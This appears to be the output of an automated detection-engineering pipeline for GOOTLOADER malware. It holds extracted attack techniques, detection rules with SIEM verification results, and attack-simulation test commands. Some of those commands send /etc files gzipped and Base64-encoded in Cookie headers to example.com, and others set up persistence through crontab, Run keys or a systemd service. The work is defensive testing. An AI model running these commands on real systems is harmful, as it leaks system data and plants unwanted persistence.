extracted_ttps.description: GOOTLOADER uses obfuscation to hide its malicious code, making it difficult to detect. The obfuscation involves hiding the code within over 10,000 lines of code and using a regex expression to find the relevant code block.
GOOTLOADER uses JavaScript for obfuscation and deobfuscation of malicious code
Attacker used PowerShell to execute scripts and decode registry payloads
Attacker used JavaScript for obfuscation and deobfuscation of scripts
PowerShell script decodes and executes the first payload
The attackers use scripting interpreters like Python to deobfuscate the contents of the JavaScript file, which may lead to the execution of malicious code.

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: Collected information is Gzip compressed, Base64 encoded, and sent to the command and control (C2) server in the Cookie header
The victim is lured into visiting a compromised website and downloading a malicious archive that contains a JavaScript file known as GOOTLOADER
The malicious ZIP file is saved to the user's Downloads folder and the user opens it, clicking on the .JS file inside
The malware uses code obfuscation to obscure its code, and scripts can automate the deobfuscation process
The user opens the ZIP file and clicks the .JS file inside, which is launched using WScript.exe
Detected PowerShell activity via NLP pattern matching
WScript.exe stores the first registry payload (FONELAUNCH) as a value in the path HKCU\SOFTWARE\Microsoft\<STRING>\%USERNAME%0
WScript.exe creates a scheduled task which executes the same PowerShell script mentioned in the previous step
Victim information collected includes environment variables, Windows OS version, filenames, and running processes
The use of PowerShell in the infection chain, including the introduction of GOOTLOADER.POWERSHELL
Internal reconnaissance is conducted after the infection, which may involve file and directory discovery
Malware collects information about running processes and environment variables
WScript.exe executes a PowerShell script that decodes and executes the first payload
GOOTLOADER requires user interaction to execute the malicious JavaScript code

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: GOOTLOADER exfiltrates data over its command and control channel
Attacker used obfuscation to hide malicious code
GOOTLOADER modifies registry payloads to maintain persistence
GOOTLOADER uses obfuscated JavaScript files to evade detection
Malware modifies registry to store payloads
Attacker relied on user interaction to execute malicious code
Malware collects system information, including OS version
Information about running processes is collected

rules.title: Obfuscated JavaScript Execution by GOOTLOADER
rules.description: Detects execution of script interpreters (cscript, wscript, node, powershell) with command lines that contain the GOOTLOADER identifier or a characteristic obfuscation pattern of multiple '+' characters, indicating the use of GOOTLOADER's hidden malicious code.

detection.condition: selection_cscript or selection_wscript or selection_powershell or selection_node

falsepositives: Legitimate administrative scripts executed with cscript/wscript/node that contain many '+' characters for string concatenation.
Internal PowerShell scripts or testing tools that include the word "GOOTLOADER" in comments or variable names.

siem_verification.message: Invalid SPL: HTTPSConnectionPool(host='192.168.80.128', port=8089): Read timed out. (read timeout=10)

rules.title: GootLoader JavaScript Decode and Execution
rules.description: Detect execution of GootLoader's JavaScript decoding script (GootLoaderAutoJsDecode.py) and subsequent execution of malicious JavaScript payloads (evil.js, DecodedJsPayload.js_) via Python or Windows Script Host.

detection.condition: selection_python or selection_cscript or selection_wscript

falsepositives: Legitimate administrative scripts executed with python.exe
System maintenance tasks using cscript.exe or wscript.exe to run benign .js files

siem_verification.message: Verification complete

rules.title: Suspicious PowerShell Execution with Malicious Script or Encoded Commands
rules.description: Detects execution of powershell.exe that either runs the known malicious script GootloaderWindowsRegDecode.ps1 or uses PowerShell flags commonly abused by attackers such as -EncodedCommand or -ExecutionPolicy. Corresponds to ATT&CK technique T1059.001 (PowerShell).

detection.condition: selection or encoded_cmd or execution_policy

falsepositives: Legitimate administrative PowerShell scripts that use -ExecutionPolicy Bypass or -EncodedCommand for automation.
System maintenance tasks that invoke PowerShell with known benign script paths.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Python Deobfuscating JavaScript via Command Line
rules.description: Detects Python interpreter executing command lines that contain JavaScript deobfuscation patterns such as eval or String.fromCharCode, which may indicate malicious script execution.

detection.condition: selection and keywords and deobfuscation_patterns

falsepositives: Legitimate development or debugging activities involving JavaScript deobfuscation
Automated testing tools that process obfuscated scripts
Security research tools analyzing malware behavior

siem_verification.message: Invalid SPL: Error in 'SearchOperator:regex': Usage: regex <field> (=|!=) <regex>.

rules.title: Exfiltration Over C2 Channel via Gzip-Compressed Base64 Payload in Cookie Header
rules.description: Detects processes that construct HTTP requests containing a Cookie header with gzip-compressed, Base64-encoded data, indicative of exfiltration over a command and control channel.

detection.condition: selection_process and selection_cookie and selection_base64 and selection_gzip

falsepositives: Legitimate automation scripts that use PowerShell or cmd.exe to send HTTP requests with cookies and encoded payloads (e.g., deployment tools, monitoring agents).
Security testing or penetration testing activities that deliberately craft such requests.
Custom internal tools that compress and encode data for transmission via cookies.
rules.technique_name: Exfiltration Over Command and Control Channel

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious User Execution of JavaScript via LOLBin Spawning Cmd with GOOTLOADER Indicators
rules.description: Detects execution of JavaScript files via LOLBins spawning cmd.exe with command lines indicative of GOOTLOADER activity, including use of forfiles or whoami, often seen in post-compromise execution chains.

detection.condition: selection_js_exec and selection_cmd_usage and not filter_benign

falsepositives: Legitimate administrative scripts that use forfiles.exe or whoami.exe in scheduled tasks with cmd.exe
Test scripts executed in development or debugging environments involving JavaScript and cmd.exe
Automated IT management tools that invoke scripts via wscript or schtasks and spawn cmd

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Malicious ZIP Archive Execution via JS File in Downloads
rules.description: Detects execution of a .JS file from a malicious ZIP archive located in the user's Downloads folder, typically launched via cmd.exe spawned by a LOLBin such as wscript.exe or forfiles.exe.

detection.condition: selection_js_file and selection_downloads and selection_parent_lolbins and not exclusion_benign_forfiles and not exclusion_benign_whoami

falsepositives: Legitimate administrative scripts using forfiles.exe with cmd.exe in system paths (excluded by path checks)
User executing personal .JS files from Downloads via command line (rare, but possible)
Scheduled tasks running scripts from user directories (mitigated by excluding system-level paths and common benign patterns)

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious PowerShell Execution via LOLBin or Malicious Arguments
rules.description: Detects suspicious PowerShell execution initiated by common LOLBins or with known malicious command-line arguments indicative of adversary command and control or script execution.

detection.condition: (selection_direct_execution and selection_malicious_args) or (selection_lolbin_parent and selection_direct_execution) and not exclusion_common_admin_tools

falsepositives: Legitimate administrative scripts launched via taskeng.exe or scheduled tasks
PowerShell usage by configuration management tools (e.g., SCCM, Intune)
CI/CD pipeline automation invoking PowerShell with policy bypass
Security tools executing PowerShell for assessment or remediation

siem_verification.message: Splunk query failed: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))

rules.title: Suspicious Registry Modification via WScript or Reg.exe Containing FONELAUNCH
rules.description: Detects attempts to modify the registry using WScript.exe or reg.exe with the value name FONELAUNCH under HKCU\SOFTWARE\Microsoft, which may indicate persistence activity.

detection.condition: selection_reg_path and (selection_reg_exe or selection_wscript)

falsepositives: Legitimate administrative scripts that use 'FONELAUNCH' as a registry value name (highly unlikely due to specificity of the value name)
Authorized software installation or configuration tools modifying HKCU\SOFTWARE\Microsoft with embedded scripts (rare and typically not using 'FONELAUNCH')

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: WScript.exe Creating Scheduled Task to Execute PowerShell
rules.description: Detects WScript.exe creating a scheduled task via schtasks or at command that executes a PowerShell script, indicative of T1053.005 - Scheduled Task.

detection.condition: selection and power_shell_execution

falsepositives: Legitimate administrative scripts that use WScript to schedule maintenance tasks
Software installers that schedule updates via scheduled tasks using WScript
Enterprise management tools that automate task scheduling through scripts

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious System Information Discovery via Command Line
rules.description: Detects suspicious system information discovery using command-line tools such as cmd.exe with commands like set, ver, systeminfo, or whoami, especially when spawned from LOLBins like forfiles.exe, schtasks.exe, wscript.exe, or mshta.exe.

detection.condition: selection_cmd and selection_commands and selection_parents and not exclusion_benign

falsepositives: Scheduled tasks that use forfiles.exe or schtasks.exe to run system queries for inventory or health checks
Legitimate administrative scripts that use wscript/cscript to launch system commands
Automated IT management tools collecting system information via cmd.exe

rules.title: Detection: File and Directory Discovery
rules.description: Internal reconnaissance is conducted after the infection, which may involve file and directory discovery

detection.condition: selection

falsepositives: Legitimate administrative activity

rules.title: Suspicious Process and Environment Discovery via Command Line
rules.description: Detects suspicious discovery of running processes and environment variables using command-line tools, often associated with post-compromise behavior and GOOTLOADER.POWERSHELL activity.

detection.condition: (selection_cmd_env or selection_cmd_processes or selection_powershell) and selection_suspicious_parents and not exclusion_benign_tasks and not exclusion_whoami_nonmalicious

falsepositives: Legitimate administrative scripts that enumerate processes or environment variables via scheduled tasks
System maintenance tasks using forfiles.exe in system directories
Help desk tools running whoami with /logonid or /groups for user context verification

rules.title: Suspicious Child Process Spawned by Office Application
rules.description: Detects when an Office application spawns a command-line shell, which is commonly seen in spearphishing attacks using malicious documents with embedded macros or scripts.

detection.condition: selection

falsepositives: Legitimate document automation tools that use Office applications to launch command-line utilities
Administrative or development scripts that programmatically control Office apps and spawn shells (rare)

rules.title: Suspicious Process Injection via LOLBin-Spawned Cmd with Forfiles or Whoami
rules.description: Detects potential process injection activity by identifying suspicious command-line executions involving forfiles.exe or whoami.exe launched through cmd.exe, especially when spawned from common LOLBins such as schtasks.exe or wscript.exe. Includes exclusions for known benign patterns to reduce false positives.

detection.condition: selection_cmd and selection_child and selection_parent_lolbin and not exclusion_benign

falsepositives: Legitimate administrative scripts using forfiles.exe or whoami.exe via scheduled tasks
System maintenance tasks triggered by schtasks.exe that invoke cmd.exe with whoami for identity verification
Software deployment scripts using wscript.exe to launch command-line utilities

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Network Service Discovery via LOLBin-Spawned Command Shell
rules.description: Detects potential network service discovery activity initiated through command-line tools (e.g., net, sc, wmic) launched from cmd.exe, where cmd.exe is spawned by known LOLBins such as forfiles.exe, whoami.exe, schtasks.exe, wscript.exe, or mshta.exe. Includes exclusions for known benign system paths and processes.

detection.condition: selection_cmd and selection_parent and selection_command and not exclusion_benign_paths and not exclusion_known_signers

falsepositives: Scheduled tasks that legitimately query service status using schtasks.exe with embedded cmd.exe calls (if not in Windows directory)
Administrative scripts that use forfiles.exe or whoami.exe in conjunction with service enumeration for system maintenance (rare)
Legacy management tools that leverage wscript or mshta to run service checks via command line

rules.title: Detection: Archive Collected Data
rules.description: Detected Archive Collected Data activity via NLP pattern matching

detection.condition: selection

falsepositives: Legitimate administrative activity

rules.title: Suspicious Scheduled Task Creation with Malicious Payload
rules.description: Detects scheduled task creation or modification using utilities like schtasks, at, or wmic with suspicious command-line arguments or payloads indicative of persistence activity.

detection.condition: (selection_schtasks or selection_at or selection_wmic or selection_parent) and (selection_payload_powershell or selection_payload_cmd or selection_payload_bitsadmin or selection_payload_certutil or selection_payload_reg)

falsepositives: Legitimate administrative task scheduling via schtasks or wmic during system maintenance or software deployment
Automated patch management systems using scheduled tasks
Enterprise management tools (e.g., SCCM, Intune) creating tasks for configuration

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Detect Input Capture (Keylogging) via Known Binaries and API Usage
rules.description: Detects execution of known keylogger binaries/DLLs, PowerShell scripts that invoke GetAsyncKeyState or Read-Host, and rundll32 executions that reference SetWindowsHookEx, indicating possible input capture activity.

detection.condition: selection_keylogger_exe or selection_keylogger_dll or selection_powershell_getasync or selection_powershell_readhost or selection_rundll32_hook

falsepositives: Legitimate administrative scripts that use GetAsyncKeyState for UI automation.
PowerShell scripts that use Read-Host for interactive prompts.
System maintenance tools invoking rundll32.exe with legitimate Windows DLLs.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Screen Capture via SnippingTool, Paint, or PowerShell Graphics API
rules.description: Detects screen capture activity using built-in Windows tools or PowerShell invoking .NET graphics libraries to capture screen content.

detection.condition: selection_snippingtool or selection_painthack or selection_powershell_capture

falsepositives: Legitimate use of Snipping Tool with /clip by end users
Manual use of MS Paint to edit images copied to clipboard
PowerShell scripts used for legitimate image processing or UI automation

rules.title: Registry Run Keys Modification via reg.exe
rules.description: Detects potential modification of Windows Registry Run keys for persistence using reg.exe. This rule identifies command-line patterns associated with adding or setting Run keys, which are commonly abused for persistence.

detection.condition: (selection_commands or selection_paths) and not excluded_parents and not excluded_users and not excluded_commands

falsepositives: Administrative scripts that modify Run keys for legitimate configuration
Scheduled tasks that use reg.exe to configure startup entries
Software installers that add entries to Run keys for user convenience
PowerShell or batch scripts used in system management that manipulate Run keys

attacks.description: Basic execution of JavaScript via PowerShell to print a test string.

attacks.expected_behavior: Creates a JavaScript file in the temp directory and attempts to execute it using cscript.

attacks.command: powershell -Command "[System.Diagnostics.Process]::Start('cmd', '/c echo This is a test > %TEMP%\test.txt'); Start-Process cmd -ArgumentList '/c type %TEMP%\test.txt';"

attacks.expected_behavior: Creates a text file in the temp directory, then displays its contents, simulating a more complex execution flow.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Compress a string, encode it with Base64, and send it in the Cookie header to a hypothetical C2 server.
attacks.expected_behavior: The command compresses a test string, encodes it, and attempts to send it to a specified URL, simulating data exfiltration.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Create a zip archive of the temp directory, encode it with Base64, and send it to a C2 server, demonstrating exfiltration of more substantial data.
attacks.expected_behavior: This command archives the temp directory, encodes the archive, and sends it to a specified URL, simulating the exfiltration of potentially sensitive data.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: powershell -Command "'Sensitive Data' | Out-File -FilePath '%TEMP%\sensitive.txt'; Compress-Archive -Path '%TEMP%\sensitive.txt' -DestinationPath '%TEMP%\sensitive.zip' -Force; $bytes = [System.IO.File]::ReadAllBytes('%TEMP%\sensitive.zip'); $encoded = [Convert]::ToBase64String($bytes); Invoke-WebRequest -Uri 'http://example.com' -Method POST -Headers @{ 'Cookie' = $encoded }"
attacks.description: Simulate collecting sensitive data, compress it, encode with Base64, and send to a C2 server, showcasing a more targeted exfiltration attempt.
attacks.expected_behavior: The command writes a test string to a file, compresses it, encodes the compressed file, and sends it to a URL, demonstrating how an attacker might exfiltrate specific data.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: echo 'Hello World' | gzip -c | base64 | xargs -I {} curl -X GET 'http://example.com' -H 'Cookie: {}'
attacks.description: Basic example of compressing a string, encoding it with Base64, and sending it in a Cookie header via curl.
attacks.expected_behavior: The command compresses 'Hello World', encodes it with Base64, and sends it in the Cookie header of a GET request to example.com.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Intermediate example involving the compression of a system file (/etc/hosts), encoding it with Base64, and sending it via curl.
attacks.expected_behavior: The command creates a gzip archive of /etc/hosts, encodes it with Base64, and sends it in the Cookie header of a GET request to example.com.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.command: find /etc -type f -print0 | xargs -0 -I {} gzip -c {} | base64 | xargs -I {} curl -X GET 'http://example.com' -H 'Cookie: {}'
attacks.description: Advanced example that finds all files in /etc, gzip compresses them, encodes with Base64, and sends each in the Cookie header via curl.
attacks.expected_behavior: The command finds files in /etc, compresses and encodes each, then sends them in the Cookie header of separate GET requests to example.com.

attacks.expected_behavior: The command will create a zip archive in the temp directory. This command does not require admin privileges and has a low safety risk.

attacks.description: Download a file using PowerShell
attacks.expected_behavior: The command will download a file from the specified URL and save it to the temp directory. This command does not require admin privileges and has a medium safety risk as it downloads a file from the internet.

attacks.description: This command uses PowerShell to get a list of running processes on the Linux system.
attacks.expected_behavior: The command will return a list of running processes without requiring admin privileges.

attacks.description: This command uses PowerShell to create a file named test.txt in the /tmp directory with the content 'Hello World!'.
attacks.expected_behavior: The command will create a file named test.txt in the /tmp directory without requiring admin privileges.

attacks.description: This command uses PowerShell to download the content of http://example.com and save it to a file named example.html in the /tmp directory.
attacks.expected_behavior: The command will download the content of http://example.com and save it to a file named example.html in the /tmp directory without requiring admin privileges.

attacks.expected_behavior: A new registry value is added to the specified key

attacks.expected_behavior: A new registry value is added to the specified key

attacks.description: Add a new registry value using reg.exe, simulating an update to an existing value
attacks.expected_behavior: The existing registry value is updated

attacks.description: Appends a test string to a configuration file, simulating registry modification

attacks.description: Prepends a test string to a bash configuration file, simulating registry modification

attacks.description: Create a scheduled task that runs a PowerShell script on startup
attacks.expected_behavior: A scheduled task is created and runs a PowerShell script on startup

attacks.description: Create a scheduled task with advanced options that runs a PowerShell script on startup
attacks.expected_behavior: A scheduled task is created with advanced options and runs a PowerShell script on startup

attacks.description: Create a scheduled task using wscript that runs a PowerShell script with encoded commands
attacks.expected_behavior: A scheduled task is created using wscript and runs a PowerShell script with encoded commands

attacks.description: Appends a command to the user's bashrc file to create a file at /tmp/persistence_test on each login, simulating persistence.
attacks.expected_behavior: On the next login, a file named persistence_test will be created in /tmp, indicating the command was executed.

attacks.description: Modifies the user's crontab to run a command at reboot, creating a file at /tmp/reboot_persistence_test, demonstrating persistence across reboots.
attacks.expected_behavior: After rebooting, a file named reboot_persistence_test will be created in /tmp, showing the command was executed at startup.

attacks.description: Adds a command to /etc/rc.local (if the file exists and is executable) to create a file at /tmp/root_persistence_test on startup, simulating root-level persistence. This requires admin privileges.
attacks.expected_behavior: On the next reboot, if /etc/rc.local is executed, a file named root_persistence_test will be created in /tmp, indicating the command ran with root privileges.

attacks.description: Displays detailed configuration information about a computer and its operating system, including service pack levels.

attacks.description: Displays user, group, and privilege information for the current user access token.

attacks.description: Displays all environment variables.
attacks.expected_behavior: Lists environment variables.

attacks.expected_behavior: Displays a list of running processes.

attacks.description: Provides detailed system information and lists the root directory's contents.

attacks.expected_behavior: Lists files and directories in the Windows directory

attacks.expected_behavior: Lists files and directories in the Windows directory

attacks.expected_behavior: Lists files and directories in the temporary directory

attacks.description: Displays all environment variables and their values, which can be useful for understanding the system's configuration and potential vulnerabilities.

attacks.description: Downloads a benign executable from a URL using certutil and saves it to the %TEMP% directory
attacks.expected_behavior: The command downloads the benign executable and saves it to the %TEMP% directory without executing it

attacks.description: Downloads a benign text file from a URL using PowerShell and saves it to the %TEMP% directory
attacks.expected_behavior: The command downloads the benign text file and saves it to the %TEMP% directory without executing it

attacks.command: cmd.exe /c echo This is a benign phishing email > %TEMP%\benign_email.txt
attacks.description: Creates a benign text file in the %TEMP% directory simulating a phishing email
attacks.expected_behavior: The command creates a benign text file in the %TEMP% directory with the specified content

attacks.command: echo 'Malicious payload' > phishing_payload.txt; cat phishing_payload.txt | base64
attacks.description: Basic phishing payload creation and encoding
attacks.expected_behavior: Creates a text file with a benign string, then encodes it using base64, simulating how a phishing payload might be prepared and encoded for transmission.

attacks.description: Intermediate phishing payload download and execution preparation
attacks.expected_behavior: Downloads a benign file from a hypothetical URL, saves it to /tmp, and makes it executable, simulating the steps an attacker might take to prepare a phishing payload for execution.

attacks.description: Advanced phishing script creation and execution with elevated privileges
attacks.expected_behavior: Creates a script with a benign string, makes it executable, and then executes it with elevated privileges, simulating an advanced phishing attack that requires admin rights to execute malicious code.

attacks.description: Injects code into notepad process to launch calc
attacks.expected_behavior: Notepad process launches calc

attacks.description: Injects code into rundll32 process to produce a beep sound
attacks.expected_behavior: Produces a beep sound

attacks.description: Injects code into cmd process to write to a file
attacks.expected_behavior: Creates a file named test.txt in $env:TEMP

attacks.description: Inject a malloc call into a running process with PID 1234 using gdb
attacks.expected_behavior: The command will attempt to inject a malloc call into the target process, which may cause the process to allocate new memory

attacks.description: Compile and run a custom program to inject a thread into a running process with PID 1234
attacks.expected_behavior: The command will attempt to inject a new thread into the target process, which may cause the process to execute new code

attacks.description: Use Perl to inject a ptrace call into a running process with PID 1234
attacks.expected_behavior: The command will attempt to inject a ptrace call into the target process, which may cause the process to allow debugging

attacks.description: Lists all running services on the local machine, which can be used to discover network services.

attacks.expected_behavior: Displays active TCP connections and listening ports.

attacks.description: Scan for listening TCP ports and services on the local machine.
attacks.expected_behavior: Lists all listening TCP ports and the corresponding services.

attacks.description: Display active Internet connections, routing tables, and interface statistics, including listening services.
attacks.expected_behavior: Shows active Internet connections, routing tables, and interface statistics, which can include information about listening services.

attacks.description: Perform a TCP connect scan against the local machine to identify open ports and services.
attacks.expected_behavior: Identifies open TCP ports on the local machine and can infer the services running on those ports.

attacks.description: This command uses PowerShell to compress and archive a system file (hosts) into a zip file located in the temporary directory, demonstrating data collection and archiving.
attacks.expected_behavior: Creates an archive of the hosts file in the temp directory.

attacks.description: This command creates a directory in the temp folder to collect data and then copies the hosts file into this directory, simulating data collection without archiving.
attacks.expected_behavior: Creates a directory in temp and copies the hosts file into it.

attacks.description: This command uses PowerShell to create a zip archive from a directory containing collected data, demonstrating the archiving of collected data.
attacks.expected_behavior: Archives the collected_data directory into a zip file in the temp directory.

attacks.description: Archives the /etc/passwd file into a tarball named archive.tar.gz in the /tmp directory.
attacks.expected_behavior: Creates an archive of the /etc/passwd file in /tmp without requiring admin privileges.

attacks.description: Archives the authentication log file into a tarball named archive2.tar.gz in the /tmp directory.
attacks.expected_behavior: Creates an archive of the authentication log file in /tmp without requiring admin privileges.

attacks.description: Archives the /etc/hosts and /etc/resolv.conf files into a zip file named archive3.zip in the /tmp directory.
attacks.expected_behavior: Creates a zip archive of the specified files in /tmp without requiring admin privileges.

attacks.description: Create a daily scheduled task named 'Test Task' that writes 'Hello' to a file in the temp directory.
attacks.expected_behavior: A new scheduled task is created, and a file named 'test.txt' with the content 'Hello' is generated in the temp directory each day.

attacks.description: Modify the 'Test Task' to append 'World' to the existing file in the temp directory.
attacks.expected_behavior: The scheduled task 'Test Task' is modified, and upon its next execution, it appends 'World' to the 'test.txt' file in the temp directory.

attacks.description: Delete the scheduled task 'Test Task'.
attacks.expected_behavior: The scheduled task 'Test Task' is deleted, and no further actions associated with this task will be executed.

attacks.command: crontab -l | { cat; echo "* * * * * echo 'Test cron job' >> /tmp/cron_test.txt"; } | crontab -
attacks.description: Create a new cron job that runs immediately and writes to a file
attacks.expected_behavior: A new cron job is created, and the file /tmp/cron_test.txt is updated with the test string

attacks.command: crontab -l | { cat; echo "0 0 * * * echo 'Test cron job at midnight' >> /tmp/cron_test.txt"; } | crontab -
attacks.description: Create a new cron job that runs at midnight and writes to a file
attacks.expected_behavior: A new cron job is created, and the file /tmp/cron_test.txt is updated with the test string at midnight

attacks.command:
echo '#!/bin/bash
echo "Test cron job script" >> /tmp/cron_test.txt' > /tmp/cron_script.sh; chmod +x /tmp/cron_script.sh; crontab -l | { cat; echo "* * * * * /tmp/cron_script.sh"; } | crontab -
attacks.description: Create a new cron job that runs a script
attacks.expected_behavior: A new cron job is created, and the script /tmp/cron_script.sh is run, updating the file /tmp/cron_test.txt

attacks.description: Simulate user input capture using PowerShell and .NET assemblies
attacks.expected_behavior: The command will prompt the user to interact with the system, simulating user input capture.

attacks.description: Capture clipboard content using PowerShell and .NET reflection
attacks.expected_behavior: The command will capture the current clipboard content, simulating input capture.

attacks.description: Simulate keystroke logging using PowerShell and WScript
attacks.expected_behavior: The command will simulate keystroke logging by sending keystrokes to the current window.

attacks.description: Basic input capture using the script command, recording all input to a file named input_capture.txt.
attacks.expected_behavior: The command starts recording the terminal session, including all user input, to the specified file until the user exits the script session with 'exit'.

attacks.description: Intermediate input capture, appending the output of the 'ls -l' command to the input_capture.txt file, demonstrating how input can be captured and logged.
attacks.expected_behavior: The command appends the output of 'ls -l' to the file, simulating the capture of specific commands or inputs.

attacks.description: Advanced input capture, forcing the script to record to the file even if it already exists, simulating a scenario where an attacker might overwrite existing logs.
attacks.expected_behavior: The command overwrites any existing content in the file with new input, demonstrating how an attacker might attempt to cover their tracks or capture specific input without leaving a trail.

attacks.description: Capture screen using mspaint and save to temp directory
attacks.expected_behavior: The screen will be captured and saved as a PNG file in the temp directory.

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save('%TEMP%\screenshot.png');"
attacks.description: Capture screen using PowerShell and save to temp directory
attacks.expected_behavior: The screen will be captured and saved as a PNG file in the temp directory using PowerShell.

attacks.command: powershell -Command "try { Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [Windows.Forms.SystemInformation]::VirtualScreen; $screenshot = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graph = [Drawing.Graphics]::FromImage($screenshot); $graph.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $screenshot.Save('%TEMP%\screenshot.png'); } catch { Write-Host 'Error capturing screen'; }"
attacks.description: Capture screen using PowerShell with error handling and save to temp directory
attacks.expected_behavior: The screen will be captured and saved as a PNG file in the temp directory using PowerShell with error handling.

attacks.description: Capture the entire screen and save it as a PNG file
attacks.expected_behavior: The command will capture the entire screen and save it as a PNG file named 'screenshot.png' in the current working directory.

attacks.description: Capture a selected region of the screen and save it as a PNG file
attacks.expected_behavior: The command will prompt the user to select a region of the screen, and then capture and save that region as a PNG file named 'screenshot.png' in the current working directory.

attacks.description: Capture the screen with a 5-second delay and save it as a PNG file
attacks.expected_behavior: The command will wait for 5 seconds, capture the entire screen, and then save it as a PNG file named 'screenshot.png' in the current working directory.

attacks.description: Add a new registry key to run notepad.exe on startup
attacks.expected_behavior: Notepad.exe will run on startup

attacks.description: Add a new registry key to run cmd.exe on startup (requires admin privileges)
attacks.expected_behavior: Cmd.exe will run on startup

attacks.description: Add a new registry key to run calc.exe on startup using PowerShell
attacks.expected_behavior: Calc.exe will run on startup

attacks.description: Creates a simple autostart script that prints 'Hello World' to demonstrate persistence via user-level autostart mechanisms.
attacks.expected_behavior: A file named 'test.desktop' is created in the user's autostart directory, which, upon the next login, will execute and print 'Hello World' to the terminal, demonstrating persistence.

attacks.description: Modifies the user's cron table to run a command at reboot, appending 'Hello World' to a file in /tmp, demonstrating persistence via cron jobs.
attacks.expected_behavior: Upon the next reboot, the system will append 'Hello World' to /tmp/test.log, showing that the command persisted and was executed at startup.

attacks.command:
sudo echo '[Unit]
Description=Test Service
[Service]
ExecStart=/bin/bash -c "echo Hello World >> /tmp/test.log"
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/test.service && sudo systemctl daemon-reload && sudo systemctl enable test.service
attacks.description: Creates a systemd service that executes a bash command at startup, demonstrating persistence via system services, requiring admin privileges.
attacks.expected_behavior: After the next reboot, the system will execute the service, appending 'Hello World' to /tmp/test.log, illustrating persistence through systemd services.
